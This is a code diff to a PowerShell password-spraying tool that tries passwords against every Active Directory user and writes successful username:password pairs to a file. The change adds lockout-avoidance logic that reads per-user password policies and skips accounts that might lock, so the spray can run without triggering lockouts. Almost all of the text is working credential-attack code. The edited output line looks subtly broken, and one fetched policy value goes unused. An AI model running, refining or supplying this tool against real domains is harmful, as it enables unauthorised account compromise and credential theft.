@@ -506,29 +506,29 @@ function Get-DomainUserList
 function Invoke-SpraySinglePassword
 {
     param(
-            [Parameter(Position=1)]
-            $Domain,
-            [Parameter(Position=2)]
-            [string[]]
-            $UserListArray,
-            [Parameter(Position=3)]
-            [string]
-            $Password,
-            [Parameter(Position=4)]
-            [string]
-            $OutFile,
-            [Parameter(Position=5)]
-            [int]
-            $Delay=0,
-            [Parameter(Position=6)]
-            [double]
-            $Jitter=0,
-            [Parameter(Position=7)]
-            [switch]
-            $UsernameAsPassword,
-            [Parameter(Position=8)]
-            [switch]
-            $Quiet
+        [Parameter(Position=1)]
+        $Domain,
+        [Parameter(Position=2)]
+        [string[]]
+        $UserListArray,
+        [Parameter(Position=3)]
+        [string]
+        $Password,
+        [Parameter(Position=4)]
+        [string]
+        $OutFile,
+        [Parameter(Position=5)]
+        [int]
+        $Delay=0,
+        [Parameter(Position=6)]
+        [double]
+        $Jitter=0,
+        [Parameter(Position=7)]
+        [switch]
+        $UsernameAsPassword,
+        [Parameter(Position=8)]
+        [switch]
+        $Quiet
     )
     $time = Get-Date
     $count = $UserListArray.count
@@ -540,18 +540,28 @@ function Invoke-SpraySinglePassword
     }
     $RandNo = New-Object System.Random
 
-    # Get domain password policy
-    $domainPolicy = Get-ADDefaultDomainPasswordPolicy
-    $lockoutThreshold = $domainPolicy.LockoutThreshold
-
     foreach ($User in $UserListArray)
     {
-        # Check if user is locked out
-        $userStatus = Get-ADUser -Identity $User -Properties BadPwdCount, LockedOut
+        # Get the fine-grained password policy for the user
+        $userStatus = Get-ADUser -Identity $User -Properties msDS-ResultantPSO, BadPwdCount, LockedOut
+
         if ($userStatus.LockedOut -eq $true)
         {
             Write-Host -ForegroundColor Red "[*] Skipping user $User because they are locked out."
             continue
+        }
+
+        # Determine the lockout threshold
+        if ($userStatus.'msDS-ResultantPSO')
+        {
+            $policy = Get-ADFineGrainedPasswordPolicy -Identity $userStatus.'msDS-ResultantPSO'
+            Write-Host "[*] User '$User' with Fine Grained Password Policy found, skipping"
+            continue
+        }
+        else
+        {
+            $domainPolicy = Get-ADDefaultDomainPasswordPolicy
+            $lockoutThreshold = $domainPolicy.LockoutThreshold
         }
 
         # Check BadPwdCount
@@ -566,12 +576,12 @@ function Invoke-SpraySinglePassword
         {
             $Password = $User
         }
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
         if ($Domain_check.name -ne $null)
         {
             if ($OutFile -ne "")
             {
-                Add-Content $OutFile $User`:$Password
+                Add-Content $OutFile "$User:$Password"
             }
             Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
         }
